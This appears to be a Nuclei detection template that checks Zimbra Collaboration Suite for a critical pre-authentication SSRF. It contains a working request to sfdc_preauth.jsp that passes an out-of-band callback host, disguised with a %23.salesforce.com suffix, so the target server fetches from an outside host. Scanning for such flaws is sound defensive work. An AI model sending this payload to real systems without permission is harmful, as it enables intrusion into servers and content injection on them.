http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: zimbra-preauth-ssrf
info:
  author: gy741
  description: A vulnerability in Zimbra Collaboration Suite allows remote unauthenticated
    attackers to cause the product to include content returned by third-party servers
    and use it as its own code.
  name: Zimbra Collaboration Suite (ZCS) - SSRF
  reference:
  - https://www.adminxe.com/2183.html
  severity: critical
  tags: zimbra,ssrf,oast
